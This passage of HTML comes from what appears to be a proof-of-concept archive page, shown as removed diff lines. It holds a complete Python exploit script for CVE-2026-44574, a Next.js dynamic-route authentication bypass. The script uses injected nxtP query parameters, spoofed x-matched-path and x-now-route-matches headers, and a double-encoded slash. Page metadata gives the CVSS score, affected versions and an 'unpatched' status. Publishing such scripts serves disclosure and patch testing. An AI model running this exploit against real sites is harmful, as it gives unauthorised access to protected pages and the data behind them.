-</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">NoRedirect</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">HTTPRedirectHandler</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">redirect_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">_a</span><span class="p">,</span> <span class="o">**</span><span class="n">_kw</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fetch</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span> <span class="ow">or</span> <span class="p">{}</span>
-</span></span><span class="line"><span class="cl">    <span class="n">req</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="s2">&#34;GET&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">opener</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">build_opener</span><span class="p">(</span><span class="n">NoRedirect</span><span class="p">())</span>
-</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="n">opener</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span><span class="p">)</span> <span class="k">as</span> <span class="n">resp</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">resp</span><span class="o">.</span><span class="n">status</span><span class="p">,</span> <span class="nb">dict</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">getheaders</span><span class="p">()),</span> <span class="n">resp</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">200_000</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">urllib</span><span class="o">.</span><span class="n">error</span><span class="o">.</span><span class="n">HTTPError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">e</span><span class="o">.</span><span class="n">code</span><span class="p">,</span> <span class="nb">dict</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">headers</span><span class="p">),</span> <span class="n">e</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">200_000</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>  <span class="c1"># noqa: BLE001</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">R</span><span class="si">}</span><span class="s2">  network error: </span><span class="si">{</span><span class="n">e</span><span class="si">}{</span><span class="n">N</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">,</span> <span class="p">{},</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">header</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">d</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">k</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="n">name</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">v</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="n">target</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;TARGET&#34;</span><span class="p">,</span> <span class="s2">&#34;http://localhost:3000&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">base</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;PROTECTED_BASE&#34;</span><span class="p">,</span> <span class="s2">&#34;/admin&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">slug</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;PROTECTED_SLUG&#34;</span><span class="p">,</span> <span class="s2">&#34;secret-page&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;PUBLIC_PATH&#34;</span><span class="p">,</span> <span class="s2">&#34;/safe&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">B</span><span class="si">}{</span><span class="s1">&#39;=&#39;</span> <span class="o">*</span> <span class="mi">65</span><span class="si">}{</span><span class="n">N</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">B</span><span class="si">}</span><span class="s2"> CVE-2026-44574 — dynamic-route param injection (nxtP*)         </span><span class="si">{</span><span class="n">N</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">B</span><span class="si">}{</span><span class="s1">&#39;=&#39;</span> <span class="o">*</span> <span class="mi">65</span><span class="si">}{</span><span class="n">N</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34; Target           : </span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34; Protected route  : </span><span class="si">{</span><span class="n">base</span><span class="si">}</span><span class="s2">/[slug]   slug=</span><span class="si">{</span><span class="n">slug</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34; Public path      : </span><span class="si">{</span><span class="n">public</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1"># ---- step 1 — baseline -----------------------------------------------</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">Y</span><span class="si">}</span><span class="s2">[1/4] Baseline — canonical GET </span><span class="si">{</span><span class="n">base</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">slug</span><span class="si">}{</span><span class="n">N</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">code</span><span class="p">,</span> <span class="n">h</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">fetch</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target</span><span class="si">}{</span><span class="n">base</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">slug</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  HTTP </span><span class="si">{</span><span class="n">code</span><span class="si">}</span><span class="s2">   Location: </span><span class="si">{</span><span class="n">header</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="s1">&#39;location&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="s1">&#39;(none)&#39;</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1"># ---- step 2 — arm A: nxtP injection ---------------------------------</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">Y</span><span class="si">}</span><span class="s2">[2/4] Bypass arm A — inject nxtPslug on a public path</span><span class="si">{</span><span class="n">N</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">qs</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">urlencode</span><span class="p">({</span>
-</span></span><span class="line"><span class="cl">        <span class="s2">&#34;nxtPslug&#34;</span><span class="p">:</span> <span class="n">slug</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__nextDefaultLocale&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__nextLocale&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="p">})</span>
-</span></span><span class="line"><span class="cl">    <span class="n">url_a</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target</span><span class="si">}{</span><span class="n">public</span><span class="si">}</span><span class="s2">?</span><span class="si">{</span><span class="n">qs</span><span class="si">}</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  GET </span><span class="si">{</span><span class="n">public</span><span class="si">}</span><span class="s2">?</span><span class="si">{</span><span class="n">qs</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">a_code</span><span class="p">,</span> <span class="n">a_h</span><span class="p">,</span> <span class="n">a_body</span> <span class="o">=</span> <span class="n">fetch</span><span class="p">(</span><span class="n">url_a</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="c1"># x-matched-path / x-now-route-matches are the headers a typical</span>
-</span></span><span class="line"><span class="cl">        <span class="c1"># Vercel-style proxy forwards. They make the inner Next server</span>
-</span></span><span class="line"><span class="cl">        <span class="c1"># treat the request as if it had already been resolved to the</span>
-</span></span><span class="line"><span class="cl">        <span class="c1"># protected dynamic route.</span>
-</span></span><span class="line"><span class="cl">        <span class="s2">&#34;x-matched-path&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base</span><span class="si">}</span><span class="s2">/[slug]&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s2">&#34;x-now-route-matches&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;1=</span><span class="si">{</span><span class="n">slug</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="p">})</span>
-</span></span><span class="line"><span class="cl">    <span class="n">a_text</span> <span class="o">=</span> <span class="n">a_body</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span> <span class="s2">&#34;replace&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  HTTP </span><span class="si">{</span><span class="n">a_code</span><span class="si">}</span><span class="s2">   Content-Type: </span><span class="si">{</span><span class="n">header</span><span class="p">(</span><span class="n">a_h</span><span class="p">,</span> <span class="s1">&#39;content-type&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1"># ---- step 3 — arm B: encoded-slash double encode --------------------</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">Y</span><span class="si">}</span><span class="s2">[3/4] Bypass arm B — double-encoded slash in dynamic segment</span><span class="si">{</span><span class="n">N</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">url_b</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target</span><span class="si">}{</span><span class="n">base</span><span class="si">}</span><span class="s2">/foo%252F</span><span class="si">{</span><span class="n">slug</span><span class="si">}</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  GET </span><span class="si">{</span><span class="n">base</span><span class="si">}</span><span class="s2">/foo%252F</span><span class="si">{</span><span class="n">slug</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">b_code</span><span class="p">,</span> <span class="n">b_h</span><span class="p">,</span> <span class="n">b_body</span> <span class="o">=</span> <span class="n">fetch</span><span class="p">(</span><span class="n">url_b</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">b_text</span> <span class="o">=</span> <span class="n">b_body</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span> <span class="s2">&#34;replace&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  HTTP </span><span class="si">{</span><span class="n">b_code</span><span class="si">}</span><span class="s2">   Location: </span><span class="si">{</span><span class="n">header</span><span class="p">(</span><span class="n">b_h</span><span class="p">,</span> <span class="s1">&#39;location&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="s1">&#39;(none)&#39;</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1"># ---- step 4 — verdict -----------------------------------------------</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">Y</span><span class="si">}</span><span class="s2">[4/4] Verdict</span><span class="si">{</span><span class="n">N</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">vuln</span> <span class="o">=</span> <span class="kc">False</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">a_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="n">SENTINEL</span> <span class="ow">in</span> <span class="n">a_text</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">vuln</span> <span class="o">=</span> <span class="kc">True</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  </span><span class="si">{</span><span class="n">R</span><span class="si">}</span><span class="s2">x VULNERABLE — arm A: public path returned the&#34;</span>
-</span></span><span class="line"><span class="cl">              <span class="sa">f</span><span class="s2">&#34; protected page (sentinel &#39;</span><span class="si">{</span><span class="n">SENTINEL</span><span class="si">}</span><span class="s2">&#39; present).</span><span class="si">{</span><span class="n">N</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">b_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="n">SENTINEL</span> <span class="ow">in</span> <span class="n">b_text</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">vuln</span> <span class="o">=</span> <span class="kc">True</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  </span><span class="si">{</span><span class="n">R</span><span class="si">}</span><span class="s2">x VULNERABLE — arm B: encoded-slash request rendered&#34;</span>
-</span></span><span class="line"><span class="cl">              <span class="sa">f</span><span class="s2">&#34; protected slug body.</span><span class="si">{</span><span class="n">N</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">vuln</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="si">{</span><span class="n">R</span><span class="si">}</span><span class="s2">&gt;&gt;&gt; RESULT: PASS (vulnerability reproduced) &lt;&lt;&lt;</span><span class="si">{</span><span class="n">N</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  </span><span class="si">{</span><span class="n">G</span><span class="si">}</span><span class="s2">v PATCHED — neither arm reached the protected page.</span><span class="si">{</span><span class="n">N</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="si">{</span><span class="n">G</span><span class="si">}</span><span class="s2">&gt;&gt;&gt; RESULT: FAIL (target appears patched &gt;= v16.2.5) &lt;&lt;&lt;</span><span class="si">{</span><span class="n">N</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div>
-      </div>
-
-    </div>
-
-    
-    <nav class="mt-12 grid grid-cols-1 gap-3 border-t border-zinc-200 pt-6 sm:grid-cols-2 dark:border-zinc-800">
-      
-        <a href="/pocs/web/2026-05-17_nextjs-i18n-middleware-bypass/" class="group rounded-lg border border-zinc-200 p-3 transition hover:border-emerald-400 dark:border-zinc-800">
-          <span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400">← previous in web</span>
-          <span class="mt-1 block truncate text-sm text-zinc-700 group-hover:text-emerald-600 dark:text-zinc-300 dark:group-hover:text-emerald-400">Next.js i18n Middleware Bypass (CVE-2026-44573)</span>
-        </a>
-      
-      
-        <a href="/pocs/web/2026-05-17_nextjs-csp-nonce-cache-poisoned-xss/" class="group rounded-lg border border-zinc-200 p-3 text-right transition hover:border-emerald-400 dark:border-zinc-800">
-          <span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400">next in web →</span>
-          <span class="mt-1 block truncate text-sm text-zinc-700 group-hover:text-emerald-600 dark:text-zinc-300 dark:group-hover:text-emerald-400">Next.js CSP Nonce Cache-Poisoned XSS (CVE-2026-44581)</span>
-        </a>
-      
-    </nav>
-  </div>
-
-  
-  <aside class="hidden lg:order-2 lg:block">
-    <div class="sticky top-20"><div class="space-y-5 rounded-lg border border-zinc-200 bg-white p-4 dark:border-zinc-800 dark:bg-zinc-900/40">
-  <div>
-  <div class="flex items-baseline justify-between">
-    <span class="font-mono text-xs uppercase tracking-wide text-zinc-500 dark:text-zinc-400">CVSS</span>
-    <span class="font-mono text-lg font-semibold text-orange-500 dark:text-orange-400">8.1<span class="text-xs text-zinc-400 dark:text-zinc-600">/10</span></span>
-  </div>
-  <div class="mt-1.5 h-1.5 w-full overflow-hidden rounded-full bg-zinc-200 dark:bg-zinc-800">
-    <div class="h-full rounded-full bg-orange-500" style="width: 81%"></div>
-  </div>
-</div>
-
-
-  <dl class="space-y-3 font-mono text-xs">
-    <div>
-      <dt class="text-zinc-500 dark:text-zinc-400">Severity</dt>
-      <dd class="mt-1"><span class="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 font-mono text-xs font-semibold uppercase tracking-wide border-orange-500/40 bg-orange-500/10 text-orange-500 dark:text-orange-400">
-  <span class="h-1.5 w-1.5 rounded-full bg-current"></span>High
-</span>
-</dd>
-    </div>
-    
-    <div>
-      <dt class="text-zinc-500 dark:text-zinc-400">CVE</dt>
-      <dd class="mt-1 text-emerald-600 dark:text-emerald-400">CVE-2026-44574</dd>
-    </div>
-    
-    <div>
-      <dt class="text-zinc-500 dark:text-zinc-400">Category</dt>
-      <dd class="mt-1">
-        <a href="/pocs/web/" class="text-zinc-700 hover:text-emerald-600 dark:text-zinc-300 dark:hover:text-emerald-400">web</a>
-      </dd>
-    </div>
-    <div>
-      <dt class="text-zinc-500 dark:text-zinc-400">Affected product</dt>
-      <dd class="mt-1 text-zinc-700 dark:text-zinc-300">Next.js App Router with dynamic route segments and middleware-based access control</dd>
-    </div>
-    
-    <div>
-      <dt class="text-zinc-500 dark:text-zinc-400">Affected versions</dt>
-      <dd class="mt-1 text-zinc-700 dark:text-zinc-300">Next.js 15.4.0 - 15.5.15 and 16.0.0 - 16.2.4</dd>
-    </div>
-    
-    <div>
-      <dt class="text-zinc-500 dark:text-zinc-400">Disclosed</dt>
-      <dd class="mt-1 text-zinc-700 dark:text-zinc-300">2026-05-17</dd>
-    </div>
-    <div>
-      <dt class="text-zinc-500 dark:text-zinc-400">Patch status</dt>
-      <dd class="mt-1">
-        <span class="text-amber-600 dark:text-amber-400">unpatched</span>
-      </dd>
-    </div>
-  </dl>
-
-  
-  <div>
-    <p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Tags</p>
-    <div class="mt-2 flex flex-wrap gap-1.5">
-      
-      <a href="/tags/auth-bypass/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#auth-bypass</a>
-      
-      <a href="/tags/dynamic-route/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#dynamic-route</a>
-      
-      <a href="/tags/nxtp-injection/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#nxtP-injection</a>
-      
-      <a href="/tags/middleware-bypass/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#middleware-bypass</a>
-      
-      <a href="/tags/param-smuggling/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#param-smuggling</a>
-      
-      <a href="/tags/next.js/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#Next.js</a>
-      
-      <a href="/tags/app-router/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#App-Router</a>
-      
-      <a href="/tags/unauthenticated/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#unauthenticated</a>
-      
-    </div>
-  </div>
-  
-
-  
-  <div>
-    <p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">References</p>
-    <ul class="mt-2 space-y-1.5">
-      
-      <li class="flex items-start gap-1.5">
-        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-        <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-44574" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://nvd.nist.gov/vuln/detail/CVE-2026-44574</a>
-      </li>
-      
-      <li class="flex items-start gap-1.5">
-        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-        <a href="https://github.com/vercel/next.js/security/advisories/GHSA-492v-c6pp-mqqv" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/vercel/next.js/security/advisories/GHSA-492v-c6pp-mqqv</a>
-      </li>
-      
-      <li class="flex items-start gap-1.5">
-        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-        <a href="https://github.com/vercel/next.js/commit/f1c11203d5" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/vercel/next.js/commit/f1c11203d5</a>
-      </li>
-      
-      <li class="flex items-start gap-1.5">
-        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-        <a href="https://github.com/dwisiswant0/next-16.2.4-pocs" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/dwisiswant0/next-16.2.4-pocs</a>
-      </li>
-      
-    </ul>
-  </div>
-  <div class="border-t border-zinc-200 pt-4 dark:border-zinc-800">
-    <p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Archive entry</p>
-    <a href="https://github.com/intelseclab/poc-archive/tree/master/pocs/web/2026-05-17_nextjs-dynamic-route-injection-auth-bypass/" target="_blank" rel="noopener noreferrer"
